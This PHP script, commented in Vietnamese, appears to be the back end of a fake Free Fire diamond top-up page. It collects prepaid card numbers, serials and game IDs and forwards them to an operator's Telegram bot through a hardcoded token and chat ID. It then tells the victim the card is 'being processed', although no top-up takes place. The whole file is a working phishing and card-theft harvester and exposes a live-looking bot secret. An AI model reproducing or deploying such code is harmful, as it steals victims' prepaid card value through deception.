<?php
// Token của bot Telegram (phần này sẽ được bảo vệ khỏi F12)
$botToken = "8467571200:AAExmACKh1qhb67Zj77Oj6CrfkGxWZzVprg"; // Thay thế bằng token thật của bạn
$chatId = "5903999893"; // Thay thế bằng chat ID của bạn hoặc ID của nhóm bạn muốn gửi tin nhắn đến

// Kiểm tra phương thức yêu cầu
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Nhận dữ liệu từ form
    $data = json_decode(file_get_contents('php://input'), true);

    if(!$data) {
        // Nếu không nhận được dữ liệu JSON, thử lấy từ form POST
        $data = $_POST;
    }

    // Validate dữ liệu
    if (
        !isset($data['userId']) ||
        !isset($data['cardNumber']) ||
        !isset($data['serialNumber']) ||
        !isset($data['diamonds']) ||
        !isset($data['value']) ||
        !isset($data['provider'])
    ) {
        http_response_code(400);
        echo json_encode(["status" => "error", "message" => "Thiếu thông tin"]);
        exit;
    }

    // Chuẩn bị nội dung tin nhắn
    $message = "🎮 *THÔNG TIN NẠP THẺ FREE FIRE* 🎮\n\n";
    $message .= "👤 *UID/Tên tài khoản*: " . $data['userId'] . "\n";
    $message .= "💳 *Loại thẻ*: " . $data['provider'] . "\n";
    $message .= "💎 *Gói kim cương*: " . $data['diamonds'] . " KC (" . $data['value'] . ")\n";
    $message .= "🔢 *Mã thẻ*: " . $data['cardNumber'] . "\n";
    $message .= "📋 *Số seri*: " . $data['serialNumber'] . "\n";
    $message .= "⏰ *Thời gian*: " . date("d/m/Y H:i:s") . "\n";

    // Gửi tin nhắn đến Telegram
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postData = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ];

    // Sử dụng cURL để gửi yêu cầu POST
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);

    $response = curl_exec($ch);
    curl_close($ch);

    $responseData = json_decode($response, true);

    // Trả về phản hồi
    if ($responseData['ok']) {
        echo json_encode(["status" => "success", "message" => "Thẻ đang được xử lý!"]);
    } else {
        http_response_code(500);
        echo json_encode(["status" => "error", "message" => "Lỗi khi gửi thông tin!"]);
    }
} else {
    // Nếu không phải phương thức POST, trả về lỗi
    http_response_code(405);
    echo json_encode(["status" => "error", "message" => "Phương thức không được hỗ trợ"]);
}
?>
